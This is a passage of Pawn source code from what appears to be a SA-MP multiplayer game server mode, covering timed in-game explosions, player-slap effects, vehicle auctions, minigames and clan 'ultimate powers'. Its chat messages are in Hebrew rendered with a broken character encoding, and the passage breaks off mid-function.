public RemoteCreateSObject(modelid,Float:xpos,Float:ypos,Float:zpos,Float:xrot,Float:yrot,Float:zrot,Float:showdis,interior,world) return CreateSObject(modelid,xpos,ypos,zpos,xrot,yrot,zrot,showdis,interior,world);
//=[HydrogenBoom]===============================================================
public HydrogenBoom(Float:x,Float:y,Float:z,pos,vw)
{
	if(pos == 0) CreateExplosionVW(x,y,z,7,0.3,vw);
	else if(pos == 1)
	{
		CreateExplosionVW(x,y,z,7,0.3,vw);
		CreateExplosionVW(x,y,z+3,7,0.3,vw);
	}
	else if(pos == 2)
	{
		CreateExplosionVW(x,y,z,7,0.3,vw);
		CreateExplosionVW(x,y,z+3,7,0.3,vw);
		CreateExplosionVW(x,y,z+6,7,0.3,vw);
	}
	else if(pos == 3)
	{
		CreateExplosionVW(x,y,z+3,7,0.3,vw);
		CreateExplosionVW(x,y,z+6,7,0.3,vw);
		CreateExplosionVW(x,y,z+9,7,0.3,vw);
	}
	else if(pos == 4)
	{
		CreateExplosionVW(x,y,z+6,7,0.3,vw);
		CreateExplosionVW(x,y,z+9,7,0.3,vw);
		CreateExplosionVW(x,y,z+12,7,0.3,vw);
	}
	else if(pos == 5)
	{
		CreateExplosionVW(x,y,z+9,7,0.3,vw);
		CreateExplosionVW(x,y,z+12,7,0.3,vw);
		CreateExplosionVW(x,y,z+15,7,0.3,vw);
	}
	else if(pos == 6)
	{
		CreateExplosionVW(x,y,z+12,7,0.3,vw);
		CreateExplosionVW(x,y,z+15,7,0.3,vw);
		CreateExplosionVW(x,y,z+18,7,0.3,vw);
	}
	else if(pos == 7)
	{
		CreateExplosionVW(x,y,z+15,7,0.3,vw);
		CreateExplosionVW(x,y,z+18,7,0.3,vw);
		CreateExplosionVW(x,y,z+21,7,0.3,vw);
	}
	else if(pos == 9)
	{
		CreateExplosionVW(x,y,z+18,7,0.3,vw);
		CreateExplosionVW(x,y,z+21,7,0.3,vw);
		CreateExplosionVW(x,y,z+24,7,0.3,vw);
		CreateExplosionVW(x,y+10,z+24,7,0.3,vw);
		CreateExplosionVW(x,y-10,z+24,7,0.3,vw);
		CreateExplosionVW(x+10,y,z+24,7,0.3,vw);
		CreateExplosionVW(x-10,y,z+24,7,0.3,vw);
	}
	else if(pos == 10)
	{
		CreateExplosionVW(x,y,z+21,7,0.3,vw);
		CreateExplosionVW(x,y,z+24,7,0.3,vw);
		CreateExplosionVW(x,y+10,z+24,7,0.3,vw);
		CreateExplosionVW(x,y-10,z+24,7,0.3,vw);
		CreateExplosionVW(x+10,y,z+24,7,0.3,vw);
		CreateExplosionVW(x-10,y,z+24,7,0.3,vw);
		CreateExplosionVW(x,y,z+27,7,0.3,vw);
		CreateExplosionVW(x,y+7,z+27,7,0.3,vw);
		CreateExplosionVW(x,y-7,z+27,7,0.3,vw);
		CreateExplosionVW(x+7,y,z+27,7,0.3,vw);
		CreateExplosionVW(x-7,y,z+27,7,0.3,vw);
	}
	else if(pos == 11)
	{
		CreateExplosionVW(x,y,z+24,7,0.3,vw);
		CreateExplosionVW(x,y+10,z+24,7,0.3,vw);
		CreateExplosionVW(x,y-10,z+24,7,0.3,vw);
		CreateExplosionVW(x+10,y,z+24,7,0.3,vw);
		CreateExplosionVW(x-10,y,z+24,7,0.3,vw);
		CreateExplosionVW(x,y,z+27,7,0.3,vw);
		CreateExplosionVW(x,y+7,z+27,7,0.3,vw);
		CreateExplosionVW(x,y-7,z+27,7,0.3,vw);
		CreateExplosionVW(x+7,y,z+27,7,0.3,vw);
		CreateExplosionVW(x-7,y,z+27,7,0.3,vw);
		CreateExplosionVW(x,y,z+30,7,0.3,vw);
		CreateExplosionVW(x,y+3,z+30,7,0.3,vw);
		CreateExplosionVW(x,y-3,z+30,7,0.3,vw);
		CreateExplosionVW(x+3,y,z+30,7,0.3,vw);
		CreateExplosionVW(x-3,y,z+30,7,0.3,vw);
	}
	else if(pos >= 12)
	{
		for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && GetPlayerDistanceToPointEx(i,x,y,z) <= 100 && GetPlayerDistanceToPointEx(i,x,y,z) >= 41) SetPlayerForwardVelocity(i,-1.5,0.2);
		if(pos >= 15)
		{
			pos = 0;
			return 1;
		}
	}
	SetTimerEx("HydrogenBoom",400,0,"fffii",x,y,z,pos+1,vw);
	return 1;
}
//=[DiehardPublic]==============================================================
public DiehardPublic(playerid)
{
	new Float:h;
	GetPlayerHealth(playerid,h);
	SetPlayerHealth(playerid,h-5.0);
	/*if(h-10.0 < 1)
	{
		playerinfo[playerid][diehard][0] = 0;
		KillTimer(playerinfo[playerid][diehard][1]);
	}*/
	return 1;
}
//=[LifeGoodPublic]=============================================================
public LifeGoodPublic(playerid)
{
	new Float:h;
	GetPlayerHealth(playerid,h);
	SetPlayerHealth(playerid,h + 1.0 > 100.0 ? 100.0 : h + 1.0);
	return 1;
}
//=[Slap]=======================================================================
public Slap(playerid)
{
	playerinfo[playerid][apslap][0]--;
	if(!playerinfo[playerid][apslap][0])
	{
		new strings[][96] =
		{
			".рь ·сыф! фрЇўш Ётю°",
			".Amit Power рЁщ юўххф ∙ьюу· ∙ьр ьф·Єёў Єэ",
			"!ф∙·чххф ьыхч фЄющ·"
		};
		SendClientMessage(playerid,red,strings[random(sizeof(strings))]);
		KillTimer(playerinfo[playerid][apslap][1]);
	}
	else
	{
		new s[16], chars[] = "rgbylwp", Float:p[3];
		format(s,sizeof(s),"~%c~%03d",chars[random(sizeof(chars))],playerinfo[playerid][apslap][0]);
		GameTextForPlayer(playerid,s,200,5);
		if(IsPlayerInAnyVehicle(playerid))
		{
			GetVehiclePos(GetPlayerVehicleID(playerid),p[0],p[1],p[2]);
			CreateExplosion(p[0],p[1],p[2],7,0.3);
			SendClientMessage(playerid,red,"BOOM");
		}
		else
		{
			SetPlayerVelocity(playerid,floatrand(-2.0,2.0),floatrand(-2.0,2.0),floatrand(-2.0,!random(10) ? 100.0 : 2.0));
			SendClientMessage(playerid,red,"AmitPower4Ever!!!");
		}
		for(new a=0;a<5;a++) PlaySound(playerid,1190,p[0],p[1],p[2]);
	}
	return 1;
}
//=[StopVAdv]===================================================================
public StopVAdv()
{
	if(sellvadv[2] != -1) CleanTimerVariable(sellvadv[2]);
	return sellvadv = {INVALID_PLAYER_ID,0,-1};
}
//=[StopAuction]================================================================
public StopAuction()
{
	if(auction[2] > 1)
	{
		KillTimer(auction[2]);
		if(auction[3] == INVALID_PLAYER_ID || !IsPlayerConnected(auction[3])) SendClientMessageToAll(orange," >> рє рчу ьр ўЁф р· ф°ыс");
		else
		{
			new string[M_S];
			if(GetMoney(auction[3]) < auction[1]) format(string,sizeof(string)," >> фЎщЄ р· ючщ° фўЁщщф фтсхф сщх·° ръ ыс° рщя ьх р· фыёє, хьыя ф°ыс ьр Ёщ·я ьрє рчу %s",GetName(auction[3]));
			else
			{
				GiveMoney(auction[3],0-auction[1], 45);
				GiveMoney(auction[0],auction[1], 45);
				playerinfo[auction[3]][vehicle][0] = playerinfo[auction[0]][vehicle][0], playerinfo[auction[3]][vehicle][1] = -1, playerinfo[auction[3]][vehicle][2] = playerinfo[auction[0]][vehicle][2];
				if(playerinfo[auction[0]][vehicle][1] != -1) DestroyVehicleEx(playerinfo[auction[0]][vehicle][1]);
				playerinfo[auction[0]][vehicle][0] = 0, playerinfo[auction[0]][vehicle][1] = -1, playerinfo[auction[0]][vehicle][2] = 0;
				if(playerinfo[auction[3]][logged])
				{
					fsetint(fuser(auction[3]),"PVehicle",playerinfo[auction[3]][vehicle][0]);
					fsetint(fuser(auction[3]),"VehicleCost",playerinfo[auction[3]][vehicle][2]);
				}
				Border(auction[3],"hidden");
				if(playerinfo[auction[0]][logged])
				{
					fsetint(fuser(auction[0]),"PVehicle",0);
					fsetint(fuser(auction[0]),"VehicleCost",0);
				}
				Border(auction[0],"hidden");
 				new total = 0;
				for(new i = 0; i <= 13; i++)
				{
					if(playerinfo[auction[3]][pvmod][i] > 0)
					{
					playerinfo[auction[3]][pvmod][i] = 0;
					format(string,sizeof(string),"VehicleMod%d",i);
					if(fkeyexist(fuser(auction[3]),string)) fremovekey(fuser(auction[3]),string);
					total++;
				}
				}
			}
			format(string,sizeof(string)," >> %s ф°ыс ЁўЁф Єь щущ",GetName(auction[3]));
			SendClientMessageToAll(orange,string);
		}
	}
	if(auction[2] != -1) CleanTimerVariable(auction[2]);
	auction = {INVALID_PLAYER_ID,0,-1,INVALID_PLAYER_ID};
	return 1;
}
//=[StartEWar]==================================================================
public StartEWar()
{
	if(debugstate) printf("Gamemode Activity [start]: StartEWar");
	#if lagtest
		LagTest_Start("StartEWar");
	#endif
	new string[M_S];
	if(thereIsAct) return 0;
	ewarinfo[0] = 1, ewarinfo[1] = 0, ewarinfo[2] = 60, ewarinfo[3] = SetTimer("StartEWar2",1000,1);
	ewarinfo[4] = ewarinfo[4] >= 1 && ewarinfo[4] <= random(sizeof(ewars)) ? ewarinfo[4] - 1 : random(sizeof(ewars));
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
	SendClientMessageToAll(green," !··чщь сЄху уўф Extra War фЇЄщьх·");
	SendClientMessageToAll(green," /join рх /ewar join ьфЎш°Їх· °∙юх р· фЇўхуф");
	SendClientMessageToAll(yellow," * .фЎш°Їх· ьрўёш°ф ххр° Єхьф " #join_act "$ хфЇ°ё ьцхыф фхр " #actprize_ewar "$");
	format(string,sizeof(string)," .[#%d] %s :ёхт фЇЄщьх·",ewarinfo[4]+1,ewars[ewarinfo[4]][ewName]);
	SendClientMessageToAll(green,string);
	SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
	format(string,sizeof(string),"~g~~h~%s~n~/join",ewars[ewarinfo[4]][ewName]);
	GameTextForAll(string,6000,1);
	thereIsAct = true;
	#if lagtest
		LagTest_End("StartEWar");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartEWar");
	return 1;
}
//=[StartEWar2]=================================================================
public StartEWar2()
{
	if(debugstate) printf("Gamemode Activity [start]: StartEWar2");
	#if lagtest
		LagTest_Start("StartEWar2");
	#endif
	new string[M_S];
	ewarinfo[2]--;
	if(ewarinfo[2] > 0)
	{
		for(new i=0;i<sizeof(ActivitiesGameTextTimes);i++)
		{
			if(ewarinfo[2] == ActivitiesGameTextTimes[i])
			{
				format(string,sizeof(string),"~g~~h~Extra War: ~h~%d~n~~g~~h~(%d/%d)",ewarinfo[2],ewarinfo[1],MAX_ACTIVITY_PLAYERS);
				GameTextForAll(string,999,4);
				for(new ii=0;ii<MAX_PLAYERS_;ii++) if(IsPlayerConnected(ii) && !playerinfo[ii][modeafk]) PlaySound(ii,1056);
			}
		}
		if(ewarinfo[2] == 10 || ewarinfo[2] == 30)
		{
			format(string,sizeof(string)," /join :фрўёш°ф ххр° ··чщь сЄху %d ∙Ёщх·, ьфЎш°Їх·",ewarinfo[2]);
			SendClientMessageToAll(brown,string);
		}
	}
	if(ewarinfo[2] == 3)
	{
		if(ewarinfo[1] < 2) return EndEWar("юёЇ° ф∙чўЁщэ ∙фЎш°Їх ўшя ю2",-1);
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitewar])
			{
				SetFreeze(i,1);
				if(IsPlayerUsingSGuard_(i)) SetPlayerGravity(i,0.008000); // guard_shit
				TakeSpecialComponent(i);
				ResetWeapons(i);
				if(IsPlayerInAnyVehicle(i))
				{
					RemovePlayerFromVehicle(i);
					SetVehicleToRespawn(GetPlayerVehicleID(i));
				}
				switch(ewarinfo[4])
				{
					case 0:
					{
						new rnd = random(sizeof(EWarPositions));
						SetPlayerPos(i,EWarPositions[rnd][0],EWarPositions[rnd][1],EWarPositions[rnd][2]);
						SetPlayerFacingAngle(i,EWarPositions[rnd][3]);
						SetPlayerInterior(i,0);
						SetPlayerHealth(i,5.0);
						SetPlayerArmour(i,0.0);
						GiveWeapon(i,23,100000);
					}
					case 1:
					{
						new rnd = random(sizeof(EWarPositions2));
						SetPlayerPos(i,EWarPositions2[rnd][0],EWarPositions2[rnd][1],EWarPositions2[rnd][2]);
						SetPlayerFacingAngle(i,EWarPositions2[rnd][3]);
						SetPlayerInterior(i,0);
						SetPlayerHealth(i,100.0);
						SetPlayerArmour(i,0.0);
					}
				}
				SetPlayerVirtualWorld(i,world_ewar);
				for(new ii=0;ii<MAX_PLAYERS_;ii++)
				{
					if(IsPlayerConnected(ii))
					{
						ShowPlayerNameTagForPlayer(ii,i,1);
						SetPlayerMarkerForPlayer(ii,i,GetColor(i,85));
					}
				}
				playerinfo[i][invisible] = 0;
				if(playerinfo[i][pet][0]) command(i,"/pet off");
				SetPlayerTeam(i,NO_TEAM);
				SetCameraBehindPlayer(i);
				SendClientMessage(i,orange," !сфЎьчф срўёш°ф ххр°");
				PlaySound(i,1083);
				playerinfo[i][inact] = 1;
			}
		}
	}
	if(ewarinfo[2] == 0)
	{
		for(new i=0;i<MAX_PLAYERS_;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitewar])
			{
				playerinfo[i][inewar] = 1, playerinfo[i][waitewar] = 0;
				SetFreeze(i,0);
			}
		}
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х [ " @c(lightblue) "ЇЄщьх· рхшхюшщ·" @h(6DC5F3) " ] Х Х Х Х Х");
		format(string,sizeof(string)," ф·чщьф! юёЇ° фю∙··Їщэ: %d Extra-юьчю· ф",ewarinfo[1]);
		SendClientMessageToAll(green,string);
		SendClientMessageToAll(grey," /astats ьЎЇщщф с∙чўЁщ фЇЄщьх· Х /aquit - ьщЎщрф юфЇЄщьх·");
		SendClientMessageToAll(0x6DC5F3FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
		KillTimer(ewarinfo[3]);
	}
	#if lagtest
		LagTest_End("StartEWar2");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: StartEWar2");
	return 1;
}
//=[WoL]========================================================================
public WoL()
{
	if(debugstate) printf("Gamemode Activity [start]: WoL");
	#if lagtest
		LagTest_Start("WoL");
	#endif
	SendClientMessageToAll(0xFAEAA9FF,"Х Х Х Х Х [ " @c(lightyellow) "ЇЄщьх· Ў'рш" @h(FAEAA9) " ] Х Х Х Х Х");
	SendClientMessageToAll(lightblue," /wol :фт°ь· тьть фюць ю·чщьф Єы∙щх! ьф∙··Їх· ф∙·ю∙х сЇўхуф");
	SendClientMessageToAll(orange," Х ф∙··Їх· сфт°ьф Єхьф 100$");
	SendClientMessageToAll(orange," Х /bonus :°хЎф ьфтущь р· ёщыхщщъ ьцых·? сч° схЁхё");
	SendClientMessageToAll(0xFAEAA9FF,"Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х Х");
	thereIsWol = 1;
	chatacttimer = SetTimer("WoL2",30000,0);
	CActID = 4;
	#if lagtest
		LagTest_End("WoL");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: WoL");
	return 1;
}
//=[WoL2]=======================================================================
public WoL2()
{
	if(debugstate) printf("Gamemode Activity [start]: WoL2");
	#if lagtest
		LagTest_Start("WoL2");
	#endif
	new string[M_S], winner = -1, players[MAX_PLAYERS], player;
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][pwol]) do players[player++] = i, playerinfo[i][wolmul] = !playerinfo[i][wolmul] ? 0 : (playerinfo[i][wolmul]-1); while playerinfo[i][wolmul] > 0;
	if(!player) SendClientMessageToAll(red," !рє рчу ьр Ё°∙э ьфт°ь· тьть фюць");
	else if(player == 1) SendClientMessageToAll(red," !°ў ∙чўя рчу Ё°∙э ьфт°ь· тьть фюць хьыя ффт°ьф юсхшь·");
	else
	{
		winner = players[random(player)];
		SendClientMessage(winner,green," !цыщ· сфт°ь· тьть фюць");
		GiveMoney(winner,wolPrize,11);
		format(string,sizeof(string)," !цыф сфт°ь· тьть фюць хўщсь %d$ %s",wolPrize,GetName(winner));
		SendClientMessageToAll(green,string);
		act_SaveWin(winner,act_Code(aid_chat,4));
	}
	thereIsWol = 0, wolPrize = 0, CActID = -1;
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i)) playerinfo[i][pwol] = 0, playerinfo[i][actbonus] = false, playerinfo[i][wolmul] = 0;
	#if lagtest
		LagTest_End("WoL2");
	#endif
	if(debugstate) printf("Gamemode Activity [end]: WoL2");
	return 1;
}
//=[Reset]======================================================================
public Reset()
{
	if(debugstate) printf("Reset() start");
	new string[32];
	if(rcd[1] <= 0)
	{
		GameTextForAll("~r~Restart!",2000,4);
		KillTimer(rcd[2]);
		rcd[0] = 0;
		command(rcd[4],rcd[3] == 1 ? ("/serverexit") : ("/gmx"));
	}
	else
	{
		valstr(string,rcd[1]);
		format(string,sizeof(string),"~b~Restart: ~h~%d",rcd[1]);
		GameTextForAll(string,2000,4);
	}
	rcd[1]--;
	if(debugstate) printf("Reset() end");
	return 1;
}
//=[ResetAmmu]==================================================================
public ResetAmmu(playerid)
{
	if(debugstate) printf("ResetAmmu() start");
	SetPlayerShopName(playerid,"FDPIZA");
	if(debugstate) printf("ResetAmmu() end");
	return 1;
}
//=[UseClanUltimatePower]=======================================================
public UseClanUltimatePower(playerid,id,ps)
{
	claninfo[playerinfo[playerid][clan]][cusingpower] = 0;
	if(!HasClanPermission(playerid,clanperm_power)) return 1;
	if(GetPlayerHQ(playerid) != playerinfo[playerid][clan]) return SendClientMessage(playerid,red," .ыхч рхьшщюшщсщ Ёщ·я ьсщЎхЄ °ў сюЇўу· фўьря ∙ьъ");
	if(claninfo[playerinfo[playerid][clan]][cusingpower]) return SendClientMessage(playerid,red,".фўьря ∙ьъ ыс° ю∙·ю∙ сыхч ы°тЄ, рЁр фю·я ∙ф∙ЇЄ·х ·ё·щщэ");
	new detectps = 0, string[M_S], pla[MAX_PLAYERS];
	for(new i = 0, p = 0; i < claninfo[playerinfo[playerid][clan]][cmembers]; i++)
	{
		p = claninfo[playerinfo[playerid][clan]][cplayers][i];
		if(GetDistanceBetweenPlayers(playerid,p) <= 10.0 && playerinfo[p][energy] < cupowers[id][CUPEnergy]) pla[detectps++] = p;
	}
	if(detectps != ps) ps = detectps;
	if(ps < 3) return SendClientMessage(playerid,red," .у°х∙щэ ьЇчх· 3 ∙х·Їщэ Єэ юёЇщў рЁ°тщф ьщЎщ°· фыхч");
	claninfo[playerinfo[playerid][clan]][cusingpower] = 1, claninfo[playerinfo[playerid][clan]][cendpower][1] = id;
	switch(id)
	{
		case 0: // Team Healing
		{
			for(new i = 0; i < detectps; i++) if(IsPlayerConnected(pla[i])) SetPlayerHealth(i,100.0);
			claninfo[playerinfo[playerid][clan]][cusingpower] = 0;
		}
		case 1: // Fire Area
		{
			new fire[] = {18688,18689,18690,18691}, o, Float:rad = 8.0, Float:p[3];
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			rad += (2 * ps);
			for(new i = 0; i < 4; i++)
			{
				AddFire(p[0] + (i == 0 || i == 1 ? (!i ? rad : -rad) : 0.0),p[1] + (i == 2 || i == 3 ? (i == 2 ? rad : -rad) : 0.0),p[2]);
				o = CreateSObject(fire[random(sizeof(fire))],p[0] + (i == 0 || i == 1 ? (!i ? rad : -rad) : 0.0),p[1] + (i == 2 || i == 3 ? (i == 2 ? rad : -rad) : 0.0),p[2],0.0,0.0,0.0);
				SetTimerEx("ObjectTimerAct",7000,0,"iiiii",o,4 + random(2),0,1,world_normal);
			}
			claninfo[playerinfo[playerid][clan]][cendpower][0] = 7;
		}
		case 2: // Full Ammo
		{
			for(new i = 0; i < detectps; i++) if(IsPlayerConnected(pla[i]))
			{
				SetPlayerHealth(pla[i],100.0);
				SetPlayerArmour(pla[i],100.0);
				ResetWeapons(pla[i]);
				for(new j = 0; j < 10; j++) GiveWeapon(pla[i],playerinfo[pla[i]][weapons][j],j == 9 || j == 8? 1 : (GetAmmunationAmmo(playerinfo[pla[i]][weapons][j])*playerinfo[pla[i]][ammo][j]));
			}
			claninfo[playerinfo[playerid][clan]][cusingpower] = 0;
		}
		case 3: // HQ Explosion
		{
			new Float:p[3], Float:xRad, xID;
			GetHQAveragePos(playerinfo[playerid][clan],p[0],p[1],p[2]);
			if(ps == 3) xID = 6, xRad = 0.0;
			else if(ps == 4) xID = 7, xRad = 0.0;
			else xID = 7, xRad = 0.3;
			CreateExplosion(p[0],p[1],p[2],xID,xRad);
			CreateExplosion(p[0] + 30.0,p[1],p[2],xID,xRad);
			CreateExplosion(p[0],p[1] + 30.0,p[2],xID,xRad);
			CreateExplosion(p[0] - 30.0,p[1],p[2],xID,xRad);
			CreateExplosion(p[0],p[1] - 30.0,p[2],xID,xRad);
			claninfo[playerinfo[playerid][clan]][cusingpower] = 0;
		}
		case 4: // Water Shield
		{
			new Float:p[3];
			GetHQAveragePos(playerinfo[playerid][clan],p[0],p[1],p[2],playerid);
			SetTimerEx("ObjectTimerAct",20000 * ps,0,"iiiii",CreateSObject(18844,p[0],p[1],p[2],0.0,0.0,0.0,object_show_distance,0,-1),0,0,1,world_normal);
			claninfo[playerinfo[playerid][clan]][cendpower][0] = 20 * ps;
		}
		case 5: // Earth Energy
		{
			new Float:p[3], objs[5], trees[] = {774,773,769};
			GetHQAveragePos(playerinfo[playerid][clan],p[0],p[1],p[2],playerid);
			for(new i = 0; i < sizeof(objs); i++)
			{
				objs[i] = CreateSObject(trees[random(sizeof(trees))],p[0] + floatrand(-4.0,4.0),p[1] + floatrand(-4.0,4.0),p[2] - 8.0,0.0,0.0,floatrand(0.0,360.0));
				GetSObjectPos(objs[i],p[0],p[1],p[2]);
				MoveSObject(objs[i],p[0],p[1],p[2] + 8.0,floatrand(2.0,3.5));
			}
			claninfo[playerinfo[playerid][clan]][cendpower][0] = 20 * ps;
			SetTimerEx("StopEarthEnergy",20000 * ps,0,"iiiiii",playerinfo[playerid][clan],objs[0],objs[1],objs[2],objs[3],objs[4]);
		}
		case 6: // X2 Damage
		{
			claninfo[playerinfo[playerid][clan]][cendpower][0] = 10 * ps;
		}
		case 7: // Coloured Circle
		{
			new plasmaballs[] = {19289,19290,19291,19292,19293,19294}, o, Float:p[3], Float:p2[3];
			GetPlayerPos(playerid,p[0],p[1],p[2]);
			for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && i != playerid && IsPlayerStreamedIn(i,playerid) && GetPlayerHQ(i) == playerinfo[playerid][clan] && playerinfo[i][clan] != playerinfo[playerid][clan] && !claninfo[playerinfo[i][clan]][cpeace][playerinfo[playerid][clan]])
			{
				o = CreateSObject(plasmaballs[random(sizeof(plasmaballs))],p[0],p[1],p[2],0.0,0.0,0.0);
				GetPlayerPos(i,p2[0],p2[1],p2[2]);
				MoveSObject(o,p2[0],p2[1],p2[2],15.0);
				objectinfo[o][oeam] = 12, objectinfo[o][odam] = 1;
			}
		}
		case 8: // Infinite Health
		{
			claninfo[playerinfo[playerid][clan]][cendpower][0] = ps * 15;
		}
		case 9: // Summon Clan God
		{
			format(string,sizeof(string),"~ %s clan god has summoned!!! ~",claninfo[playerinfo[playerid][clan]][cname]);
			SendClientMessageToAll(blue,string);
			new Float:p[3], Float:op[3], Float:x = 0.0, Float:y = 0.0, Float:z = 0.0, Float:ap[3], Float:xoffset[17], Float:yoffset[17], Float:zoffset[17];
			GetHQAveragePos(playerinfo[playerid][clan],p[0],p[1],p[2],playerid);
			new start = CreateSObject(6865, 2491.044189, -1671.732178, 17.215425, 0.0000, 0.0000, 225.0000);
			CreateSObject(1454, 2491.036621, -1672.029175, 17.984144, 268.8997, 0.0000, 0.0000);
			CreateSObject(1454, 2491.033203, -1672.064941, 16.662184, 268.8997, 0.0000, 0.0000);
			CreateSObject(1454, 2491.021729, -1672.095703, 15.333357, 268.8997, 0.0000, 0.0000);
			CreateSObject(1453, 2492.080078, -1672.064087, 16.928087, 0.0000, 302.4178, 0.0000);
			CreateSObject(1453, 2492.955811, -1672.052490, 16.363297, 0.0000, 302.4178, 0.0000);
			CreateSObject(1453, 2493.592285, -1671.781006, 15.854113, 0.0000, 304.9961, 42.1124);
			CreateSObject(1453, 2490.028076, -1672.041626, 16.914240, 0.0000, 302.4178, 191.2501);
			CreateSObject(1453, 2489.163574, -1672.213379, 16.349632, 0.0000, 302.4178, 191.2501);
			CreateSObject(1453, 2488.538086, -1672.068604, 15.838520, 0.0000, 304.9961, 143.3623);
			CreateSObject(3524, 2494.013184, -1671.439209, 16.166496, 0.0000, 0.0000, 180.0000);
			CreateSObject(3461, 2488.146729, -1671.680420, 16.467579, 0.0000, 0.0000, 0.0000);
			CreateSObject(1453, 2491.531982, -1672.076172, 14.236114, 0.0000, 341.0924, 0.0000);
			CreateSObject(1453, 2490.540771, -1672.090210, 14.267446, 0.0000, 341.0924, 180.0000);
			CreateSObject(1453, 2491.693604, -1672.075439, 13.286838, 0.0000, 0.0000, 0.0000);
			CreateSObject(1453, 2490.391846, -1672.111816, 13.326725, 0.0000, 0.0000, 0.0000);
			new end = CreateSObject(3277, 2491.092285, -1672.558105, 12.308545, 0.0000, 0.0000, 348.7500);
			for(new i = start; i <= end; i++)
			{
				GetSObjectPos(i,op[0],op[1],op[2]);
				x += op[0], y += op[1], z += op[2];
			}
			ap[0] = floatdiv(x,17.0), ap[1] = floatdiv(y,17.0), ap[2] = floatdiv(z,17.0);
			for(new i = start; i <= end; i++)
			{
				GetSObjectPos(i,op[0],op[1],op[2]);
				xoffset[i] = ap[0] - op[0], yoffset[i] = ap[1] - op[1], zoffset[i] = ap[2] - op[2];
			}
			for(new i = start; i <= end; i++)
			{
				claninfo[playerinfo[playerid][clan]][cgodobject][claninfo[playerinfo[playerid][clan]][cgodobjects]++] = i;
				objectinfo[i][ocgod] = playerinfo[playerid][clan];
				GetSObjectPos(i,op[0],op[1],op[2]);
				op[0] += xoffset[i], op[1] += yoffset[i], op[2] += zoffset[i];
				SetSObjectPos(i,op[0],op[1],op[2] + 50.0);
				MoveSObject(i,op[0],op[1],op[2],7.5);
			}
			for(new i = start; i <= end; i++)
			{
				claninfo[playerinfo[playerid][clan]][cgodobject][claninfo[playerinfo[playerid][clan]][cgodobjects]++] = i;
				objectinfo[i][ocgod] = playerinfo[playerid][clan];
				GetSObjectPos(i,op[0],op[1],op[2]);
				op[0] += xoffset[i], op[1] += yoffset[i], op[2] += zoffset[i];
				SetSObjectPos(i,op[0],op[1],op[2] + 50.0);
				MoveSObject(i,op[0],op[1],op[2],7.5);
			}
			SetPlayerPos(playerid,op[0],op[1],op[2] + 50.0);
		}
	}
	for(new i = 0; i < ps; i++) TakeEnergy(pla[i],cupowers[id][CUPEnergy]);
    format(string,sizeof(string)," л Ultimate Clan Power ╗ !%s фЇЄщьх р· фыхч %s хЄху %d ∙чўЁщэ юфўьря %s",cupowers[id][CUPName],claninfo[playerinfo[playerid][clan]][cname],ps-1,GetName(playerid)), SendClientMessageToAll(orange,string);
    for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && GetPlayerHQ(i) == playerinfo[playerid][clan]) SendClientMessageToAll(orange,string);
	return 1;
}
//=[StopEarthEnergy]============================================================
public StopEarthEnergy(userclan,o1,o2,o3,o4,o5)
{
	new o = o1, Float:p[3];
	goto donetoobj;
	donetoobj:
	{
		GetSObjectPos(o,p[0],p[1],p[2]);
		MoveSObject(o,p[0],p[1],p[2]-8.0,floatrand(2.0,3.5));
		objectinfo[o][odam] = 1;
	}
	if(o != o5)
	{
		if(o == o1) o = o2;
		else if(o == o2) o = o3;
		else if(o == o3) o = o4;
		else if(o == o4) o = o5;
		goto donetoobj;
	}
	claninfo[userclan][cendpower] = {0,-1};
	claninfo[userclan][cusingpower] = 0;
	return 1;
}
//=[ClanGodAttack]==============================================================
public ClanGodAttack(userclan)
{
	new Float:p[3], player[MAX_PLAYERS], players = 0, attack = random(3), Float:h;
	GetHQAveragePos(userclan,p[0],p[1],p[2]);
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && playerinfo[i][clan] != userclan && GetPlayerDistanceToPointEx(i,p[0],p[1],p[2]) <= 100.0 && GetPlayerHealth(i,h) > 1.0) player[players++] = i;
	if(!players)
	{
		for(new i = 0; i < claninfo[userclan][cgodobjects]; i++) DestroySObject(claninfo[userclan][cgodobject][i]);
		claninfo[userclan][cgodobject] = 0, claninfo[userclan][cgodobjects] = 0, claninfo[userclan][cusingpower] = 0;
		new string[M_S];
		format(string,sizeof(string),"~ It's the time for the %s clan god to go. ~",claninfo[userclan][cname]);
		return SendClientMessageToAll(blue,string);
	}
	new attacked = player[random(players)];
	GetPlayerPos(attacked,p[0],p[1],p[2]);
	for(new i = 0; i < claninfo[userclan][cgodobjects]; i++) SetObjectToFaceCords(claninfo[userclan][cobject][i],p[0],p[1],p[2]);
	for(new i = 1; i <= 3; i++) SetTimerEx("ClanGodAttack2",900 * i,0,"iii",attacked,attack,userclan);
	SetTimerEx("ClanGodAttack",4000,0,"i",userclan);
	return 1;
}
//=[ClanGodAttack2]=============================================================
public ClanGodAttack2(attacked,attack,userclan)
{
	new Float:p[3], Float:hqp[3];
	GetPlayerPos(attacked,p[0],p[1],p[2]);
	switch(attack)
	{
		case 0: /* Fire shooting */
		{
			CreateExplosion(p[0] + floatrand(-3.0,3.0),p[1],p[2],4,0);
			CreateExplosion(p[0],p[1] + floatrand(-3.0,3.0),p[2],4,0);
		}
		case 1: /* Earthquake */ CreateExplosion(p[0],p[1],p[2] - 5.0,12,0.3);
		case 2: /* Rockets */
		{
